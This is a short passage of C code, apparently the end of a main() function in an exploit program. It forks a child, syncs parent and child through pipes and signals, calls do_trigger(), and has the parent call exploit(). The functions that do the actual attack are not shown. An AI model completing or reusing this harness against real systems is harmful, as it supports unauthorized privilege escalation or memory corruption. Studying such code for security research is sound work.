  memset(global_data, 0, 0x1000);

  printf("global data at %p, buffer at %p\n", global_data, global_buffer);

  // parent_id = getpid();
  child_pid = fork();
  if (child_pid < 0)
    err(1, "fork");

  if (child_pid == 0) {
    char data[0x10];
    pipe(signal_pipes);
    write(signal_pipes[1], "T", 1);
    read(signal_pipes[0], data, 1);
    signal(SIGUSR1, signal_handler);
    read(signal_pipes[0], data, 1);
    assert(data[0] == 'S');
    do_trigger();
    kill(getppid(), SIGUSR2);
    exit(0);
  }
  signal(SIGUSR2, signal_handler);
  signal(SIGUSR1, signal_handler);

  if (pipe(signal_pipes) < 0) {
    err(1, "pipe in parent");
  }

  exploit();
}